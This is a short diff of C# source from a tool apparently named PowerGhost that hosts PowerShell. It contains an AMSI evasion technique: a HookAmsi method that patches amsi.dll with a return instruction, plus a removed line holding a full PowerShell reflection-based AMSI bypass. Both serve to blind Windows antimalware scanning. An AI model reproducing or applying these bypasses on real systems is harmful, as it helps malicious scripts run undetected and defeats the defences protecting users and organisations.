@@ -25,7 +25,7 @@ namespace PowerGhost
         static void HookAmsi()
         {
             // everything is alright, nothing to see here
-	      // we don't send the buffer to amsi.dll
+	    // we don't send the buffer to amsi.dll
             byte[] retOne = new byte[] { 0xC2, 0x00, 0x00 };
 
             unsafe 
@@ -60,9 +60,6 @@ namespace PowerGhost
             // associate the runspace with a powershell object
             PowerShell ps = PowerShell.Create();
             ps.Runspace = rs;
-
-            // this is the AMSI bypass
-            //string bypass = "$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like \"*iutils\") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like \"*Context\") {$f = $e}};$g = $f.GetValue($null);[IntPtr]$ptr = $g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);";
 
             Console.Title = "PowerGhost";
             Console.BackgroundColor = ConsoleColor.DarkRed;
